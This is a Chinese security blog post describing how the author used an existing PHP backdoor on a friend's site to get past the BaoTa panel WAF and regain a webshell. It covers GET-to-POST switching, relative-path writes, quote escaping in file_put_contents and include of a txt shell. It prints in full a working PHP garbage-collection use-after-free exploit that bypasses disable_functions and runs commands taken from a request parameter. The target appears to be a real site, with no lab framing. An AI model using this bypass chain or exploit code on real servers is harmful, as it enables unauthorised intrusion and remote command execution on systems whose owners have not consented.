# 绕过宝塔Getshell

阅读量 **344065**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-15 16:30:36

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01bbd0cadef139db4b.gif)

## 前言

朋友丢过来一个站，说站点的webshell掉了，并且上了宝塔，但是后门还在，由于宝塔的原因迟迟无法再次getshell。正好不在乙方工作多年，好久没遇到WAF对抗了，就要过来看看。

## Bypass 宝塔

###  disable_function拦截

首先当看到朋友给的后门数据包时有点懵，以为是什么漏洞，先放到burp里看看：

![](https://p0.ssl.qhimg.com/t0147a3cda445c79802.png)

这下明白他一开始给的代码的意思了，是一个后门，接收content的值放到php代码里，相当于一个可以执行任意php代码的后门，他给的数据包就是接收b和d的值去执行。但是根据上面的报错，也能看出出现了两个`<?php`，我先删除掉一个试试，然后尝试构造d执行个whomai（base64编码）试试：

![](https://p3.ssl.qhimg.com/t01e9239f123b869bec.png)

看响应包应该是disable_function搞的鬼。

## POST绕过GET拦截

那我尝试phpinfo试试，发现是可以的：

![](https://p2.ssl.qhimg.com/t01861f61277285b3e5.png)

现在命令无法执行，想要绕过disable_function，现在这样又不好操作，想着是用webshell管理工具连上去方便操作（写文件、看文件等操作），但是直接用webshell管理工具连接也会被宝塔拦截：

![](https://p2.ssl.qhimg.com/t015b97267ff6992eec.png)

那我就尝试写一个新的webshell进去。首先content值可以写任意php代码，首先尝试phpinfo，发现被拦截：

![](https://p1.ssl.qhimg.com/t0182dc0bb6f17df46a.png)

但是我改成POST就可以绕过：

![](https://p5.ssl.qhimg.com/t018f2a2ef6dd5c7bb4.png)

## 相对路径Bypass

通过报错得到了网站的绝对路径，尝试使用file_put_contents写文件发现被拦截，通过相对路径就不会被拦截：

![](https://p5.ssl.qhimg.com/t01a823922b74de49f2.png)

想着是file_put_contents写一个马，但是尝试发现无法写入到php文件，txt却可以。一开始怀疑是目录问题，尝试写到upload和image等静态文件目录，发现依然不行，最终php依然没写成功，但是思路转换下，既然有可以执行php代码的口子，又可以往txt里写文件，那我直接include，做文件包含不就行了？

## file_put_contents 绕过

在写马的过程中，file_put_contents第二个参数不能用`<?php`，有就会报错：

![](https://p2.ssl.qhimg.com/t010bef1002a048b2dc.png)

也不能有双引号，会被转义，也就是file_put_contents的值只能用单引号引起来：

![](https://p0.ssl.qhimg.com/t01c40fcb8180b3cfda.png)

但是值只能用单引号引起来的话，如果马也需要用到单引号，那么file_put_contents的第二个参数就会变成`'$_POST['a']'`，引号里面又有个引号，依然会报错。

因此这里首先使用`{php}`代替`<?php`，然后使用`\'`来注释`'`单引号来让单引号“逃”出来。最终成功的往txt写入了webshell，上面提到，普通的webshell会被拦截：

![](https://p5.ssl.qhimg.com/t01058aabd4b9ce806f.png)

那我直接数据包加密不就行了？见[渗透中的后门利用](https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA)

最终成功getshell，webshell连接配置如下：

![](https://p1.ssl.qhimg.com/t01cc96d9020099b85f.png)

![](https://p2.ssl.qhimg.com/t01de4e40ea97bad566.png)

## disable_function bypass

通过种种突破终于拿到了webshell，也更加方便的进行shell操作，但是上面提到，因为有disable_function的原因，导致一些函数无法调用从而导致命令无法执行：

![](https://p5.ssl.qhimg.com/t0153e2baab343158ca.png)

通过phpinfo也能证明上面的猜想：

![](https://p4.ssl.qhimg.com/t01757c5c82b3e0171c.png)

这里我直接使用gc bypass disable_function，这里给出示例代码：

    
    
    <?php
    $command = $_GET['cmd'];
    pwn($command);
    
    function pwn($cmd) {
        global $abc, $helper;
    
        function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address <<= 8;
                $address |= ord($str[$p+$j]);
            }
            return $address;
        }
    
        function ptr2str($ptr, $m = 8) {
            $out = "";
            for ($i=0; $i < $m; $i++) {
                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
            }
            return $out;
        }
    
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i < $n; $i++) {
                $str[$p + $i] = chr($v & 0xff);
                $v >>= 8;
            }
        }
    
        function leak($addr, $p = 0, $s = 8) {
            global $abc, $helper;
            write($abc, 0x68, $addr + $p - 0x10);
            $leak = strlen($helper->a);
            if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
            return $leak;
        }
    
        function parse_elf($base) {
            $e_type = leak($base, 0x10, 2);
    
            $e_phoff = leak($base, 0x20);
            $e_phentsize = leak($base, 0x36, 2);
            $e_phnum = leak($base, 0x38, 2);
    
            for($i = 0; $i < $e_phnum; $i++) {
                $header = $base + $e_phoff + $i * $e_phentsize;
                $p_type  = leak($header, 0, 4);
                $p_flags = leak($header, 4, 4);
                $p_vaddr = leak($header, 0x10);
                $p_memsz = leak($header, 0x28);
    
                if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                    # handle pie
                    $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                    $data_size = $p_memsz;
                } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                    $text_size = $p_memsz;
                }
            }
    
            if(!$data_addr || !$text_size || !$data_size)
                return false;
    
            return [$data_addr, $text_size, $data_size];
        }
    
        function get_basic_funcs($base, $elf) {
            list($data_addr, $text_size, $data_size) = $elf;
            for($i = 0; $i < $data_size / 8; $i++) {
                $leak = leak($data_addr, $i * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = leak($leak);
                    # 'constant' constant check
                    if($deref != 0x746e6174736e6f63)
                        continue;
                } else continue;
    
                $leak = leak($data_addr, ($i + 4) * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = leak($leak);
                    # 'bin2hex' constant check
                    if($deref != 0x786568326e6962)
                        continue;
                } else continue;
    
                return $data_addr + $i * 8;
            }
        }
    
        function get_binary_base($binary_leak) {
            $base = 0;
            $start = $binary_leak & 0xfffffffffffff000;
            for($i = 0; $i < 0x1000; $i++) {
                $addr = $start - 0x1000 * $i;
                $leak = leak($addr, 0, 7);
                if($leak == 0x10102464c457f) { # ELF header
                    return $addr;
                }
            }
        }
    
        function get_system($basic_funcs) {
            $addr = $basic_funcs;
            do {
                $f_entry = leak($addr);
                $f_name = leak($f_entry, 0, 6);
    
                if($f_name == 0x6d6574737973) { # system
                    return leak($addr + 8);
                }
                $addr += 0x20;
            } while($f_entry != 0);
            return false;
        }
    
        class ryat {
            var $ryat;
            var $chtg;
    
            function __destruct()
            {
                $this->chtg = $this->ryat;
                $this->ryat = 1;
            }
        }
    
        class Helper {
            public $a, $b, $c, $d;
        }
    
        if(stristr(PHP_OS, 'WIN')) {
            die('This PoC is for *nix systems only.');
        }
    
        $n_alloc = 10; # increase this value if you get segfaults
    
        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = str_repeat('A', 79);
    
        $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
        $out = unserialize($poc);
        gc_collect_cycles();
    
        $v = [];
        $v[0] = ptr2str(0, 79);
        unset($v);
        $abc = $out[2][0];
    
        $helper = new Helper;
        $helper->b = function ($x) { };
    
        if(strlen($abc) == 79 || strlen($abc) == 0) {
            die("UAF failed");
        }
    
        # leaks
        $closure_handlers = str2ptr($abc, 0);
        $php_heap = str2ptr($abc, 0x58);
        $abc_addr = $php_heap - 0xc8;
    
        # fake value
        write($abc, 0x60, 2);
        write($abc, 0x70, 6);
    
        # fake reference
        write($abc, 0x10, $abc_addr + 0x60);
        write($abc, 0x18, 0xa);
    
        $closure_obj = str2ptr($abc, 0x20);
    
        $binary_leak = leak($closure_handlers, 8);
        if(!($base = get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
    
        if(!($elf = parse_elf($base))) {
            die("Couldn't parse ELF header");
        }
    
        if(!($basic_funcs = get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
    
        if(!($zif_system = get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
    
        # fake closure object
        $fake_obj_offset = 0xd0;
        for($i = 0; $i < 0x110; $i += 8) {
            write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
        }
    
        # pwn
        write($abc, 0x20, $abc_addr + $fake_obj_offset);
        write($abc, 0xd0 + 0x38, 1, 4); # internal func type
        write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    
        ($helper->b)($cmd);
    
        exit();
    }
    

最终也成功的执行了命令：

![](https://p0.ssl.qhimg.com/t0170bc63ba37556958.png)

## 总结

本文介绍了在有代码执行漏洞（后门）的情况下，通过多个技术手段绕过宝塔达到了写入webshell和执行命令的目的。现在网站大多数都接入了WAF，如何绕过WAF是个需要长期思考的问题。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Jumbo** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/255611](/post/id/255611)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透](/tag/渗透)
  * [Bypass WAF](/tag/Bypass WAF)

 **+1** __7赞

 __收藏

![](https://p1.ssl.qhimg.com/t01d1ca8a451d603411.png) Jumbo

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

